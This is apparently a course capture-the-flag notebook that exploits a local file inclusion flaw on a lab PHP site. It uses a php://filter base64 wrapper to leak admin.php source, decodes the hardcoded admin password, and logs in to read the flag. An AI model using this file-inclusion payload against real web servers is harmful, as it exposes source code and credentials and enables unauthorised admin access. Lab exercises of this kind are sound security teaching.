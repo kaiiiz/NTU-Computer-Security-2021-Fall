{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "40b776fc-6f96-4f19-990a-a94c5d4aa46e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<!DOCTYPE html>\\n<html lang=\"en\">\\n\\n<head>\\n    <meta charset=\"UTF-8\">\\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\\n    <title>Meow</title>\\n    <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css\">\\n</head>\\n\\n<body>\\n    <nav class=\"navbar is-dark\" role=\"navigation\" aria-label=\"main navigation\">\\n        <div class=\"navbar-brand\">\\n            <a class=\"navbar-item\" href=\"/?page=inc/home\">🐱</a>\\n        </div>\\n\\n        <div id=\"navbarBasicExample\" class=\"navbar-menu\">\\n            <div class=\"navbar-start\">\\n                <a class=\"navbar-item\" href=\"/?page=inc/home\">\\n                    Home\\n                </a>\\n                <a class=\"navbar-item\" href=\"/?page=inc/about\">\\n                    About\\n                </a>\\n                <a class=\"navbar-item\" href=\"/admin.php\">\\n                    Admin\\n                </a>\\n            </div>\\n        </div>\\n    </nav>\\n\\n    <div class=\"container\" style=\"margin-top: 1em;\">\\n        PGgxPkFkbWluIFBhbmVsPC9oMT4KPGZvcm0+CiAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIHZhbHVlPSJhZG1pbiI+CiAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIj4KICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiPgo8L2Zvcm0+Cgo8P3BocAokYWRtaW5fYWNjb3VudCA9IGFycmF5KCJ1c2VybmFtZSIgPT4gImFkbWluIiwgInBhc3N3b3JkIiA9PiAia3FxUEZPYnd4VThIWW84RTVRZ05MaGRPeHZabXRQaHlCQ3lEeEN3cHZBUSIpOwppZiAoCiAgICBpc3NldCgkX0dFVFsndXNlcm5hbWUnXSkgJiYgaXNzZXQoJF9HRVRbJ3Bhc3N3b3JkJ10pICYmCiAgICAkX0dFVFsndXNlcm5hbWUnXSA9PT0gJGFkbWluX2FjY291bnRbJ3VzZXJuYW1lJ10gJiYgJF9HRVRbJ3Bhc3N3b3JkJ10gPT09ICRhZG1pbl9hY2NvdW50WydwYXNzd29yZCddCikgewogICAgZWNobyAiPGgxPkxPR0lOIFNVQ0NFU1MhPC9oMT48cD4iLmdldGVudignRkxBRycpLiI8L3A+IjsKfQoKPz4=    </div>\\n</body>\\n\\n</html>'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "requests.get(\"http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin\").text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "0a342a78-0524-456a-931c-8cc4d46ff44b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'<h1>Admin Panel</h1>\\n<form>\\n    <input type=\"text\" name=\"username\" value=\"admin\">\\n    <input type=\"password\" name=\"password\">\\n    <input type=\"submit\" value=\"Submit\">\\n</form>\\n\\n<?php\\n$admin_account = array(\"username\" => \"admin\", \"password\" => \"kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ\");\\nif (\\n    isset($_GET[\\'username\\']) && isset($_GET[\\'password\\']) &&\\n    $_GET[\\'username\\'] === $admin_account[\\'username\\'] && $_GET[\\'password\\'] === $admin_account[\\'password\\']\\n) {\\n    echo \"<h1>LOGIN SUCCESS!</h1><p>\".getenv(\\'FLAG\\').\"</p>\";\\n}\\n\\n?>'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import base64\n",
    "\n",
    "base64.b64decode(\"PGgxPkFkbWluIFBhbmVsPC9oMT4KPGZvcm0+CiAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiIHZhbHVlPSJhZG1pbiI+CiAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIj4KICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiPgo8L2Zvcm0+Cgo8P3BocAokYWRtaW5fYWNjb3VudCA9IGFycmF5KCJ1c2VybmFtZSIgPT4gImFkbWluIiwgInBhc3N3b3JkIiA9PiAia3FxUEZPYnd4VThIWW84RTVRZ05MaGRPeHZabXRQaHlCQ3lEeEN3cHZBUSIpOwppZiAoCiAgICBpc3NldCgkX0dFVFsndXNlcm5hbWUnXSkgJiYgaXNzZXQoJF9HRVRbJ3Bhc3N3b3JkJ10pICYmCiAgICAkX0dFVFsndXNlcm5hbWUnXSA9PT0gJGFkbWluX2FjY291bnRbJ3VzZXJuYW1lJ10gJiYgJF9HRVRbJ3Bhc3N3b3JkJ10gPT09ICRhZG1pbl9hY2NvdW50WydwYXNzd29yZCddCikgewogICAgZWNobyAiPGgxPkxPR0lOIFNVQ0NFU1MhPC9oMT48cD4iLmdldGVudignRkxBRycpLiI8L3A+IjsKfQoKPz4=\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "3abde66c-8f36-454b-941a-23d74ea5f7ae",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<h1>Admin Panel</h1>\\n<form>\\n    <input type=\"text\" name=\"username\" value=\"admin\">\\n    <input type=\"password\" name=\"password\">\\n    <input type=\"submit\" value=\"Submit\">\\n</form>\\n\\n<h1>LOGIN SUCCESS!</h1><p>FLAG{ezzzz_lfi}</p>'"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "requests.get(\"http://h4ck3r.quest:8400/admin.php?username=admin&password=kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ\").text"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
